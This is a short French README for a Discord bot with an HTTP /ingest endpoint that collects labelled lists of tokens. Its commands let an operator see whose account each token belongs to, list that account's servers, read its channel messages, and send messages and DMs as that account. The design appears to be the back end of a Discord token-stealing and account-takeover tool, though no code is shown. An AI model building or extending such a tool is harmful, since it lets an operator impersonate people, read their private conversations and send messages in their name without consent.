# discord-bot

Bot Discord + endpoint HTTP pour recevoir des tokens.

## Variables d'environnement

- `BOT_TOKEN` — token du bot Discord (obligatoire)
- `INGEST_KEY` — clé secrète pour l'endpoint /ingest (obligatoire)
- `PORT` — port HTTP (Railway le fournit auto)

## Endpoints

- `POST /ingest` — reçoit `{"label": "nom", "tokens": ["tok1","tok2"]}` avec header `X-Key: <INGEST_KEY>`

## Commandes bot (réservées au MANAGER_ID)

- `!add <label> <token>` — ajoute un token
- `!list` — liste les tokens stockés
- `!who <label>` — à qui appartient le token
- `!guilds <label>` — liste les serveurs du compte
- `!read <label> <channel_id> [count]` — lit les derniers messages
- `!send <label> <channel_id> <texte>` — envoie un message
- `!dm <label> <user_id> <texte>` — envoie un DM
- `!rm <label>` — supprime un token
